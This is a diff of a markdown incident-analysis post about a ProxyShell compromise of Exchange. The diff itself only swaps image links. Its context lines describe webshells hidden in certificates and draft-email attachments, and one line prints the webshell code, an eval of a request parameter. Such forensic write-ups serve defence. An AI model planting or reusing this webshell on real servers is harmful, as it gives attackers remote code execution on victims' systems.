@@ -76,19 +76,19 @@ Although, the technique “**New-ExchangeCertificate**” was used multiple time
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\REQUEST\Certificates\B7B88BD73AD03FF23423432423523534565D34C”.`
 - `“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\REQUEST\Certificates\E8B90934234BB9527DA8CA5B7CB4AE280A505C184217`”.
 
-![System registry](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled.png)
+![System registry](https://github.com/darksys0x/darksys0x.github.io/raw/master/_posts/imgs/proxyshell/Untitled.png)
 
 System registry
 
 The following figure demonstrates evidence of a certificate obtained from the system registry.
 
-![Certificate found with webshell embedded inside](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%201.png)
+![Certificate found with webshell embedded inside](https://github.com/darksys0x/darksys0x.github.io/raw/master/_posts/imgs/proxyshell/Untitled%201.png)
 
 Certificate found with webshell embedded inside
 
 The extracted webshell which was embedded in the certificate.
 
-![Webshell post-extracting from certificate](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%202.png)
+![Webshell post-extracting from certificate](https://github.com/darksys0x/darksys0x.github.io/raw/master/_posts/imgs/proxyshell/Untitled%202.png)
 
 Webshell post-extracting from certificate
 
@@ -121,7 +121,7 @@ Moreover, the malicious actor exported 'Hamad@darksys.com
 
 **FileAttachment.txt** in the draft email is usually a webshell, however, since this was the first email created by the malicious actor, refer to the below figure. created draft emails have a webshell in the attachment.
 
-![The Export email that contains a webshell.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%203.png)
+![The Export email that contains a webshell.](https://github.com/darksys0x/darksys0x.github.io/raw/master/_posts/imgs/proxyshell/Untitled%203.png)
 
 The Export email that contains a webshell.
 
@@ -131,7 +131,7 @@ drafts emails created by the malicious actor contain the same webshell. For inst
 script language = 'JScript' runat = 'server' >function Page_Load() {    eval(Request['exec_code'], 'unsafe');    Response.End;.}< /script>
 ```
 
-![The PST File with plain JavaScript code](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%204.png)
+![The PST File with plain JavaScript code](https://github.com/darksys0x/darksys0x.github.io/raw/master/_posts/imgs/proxyshell/Untitled%204.png)
 
 The PST File with plain JavaScript code
 
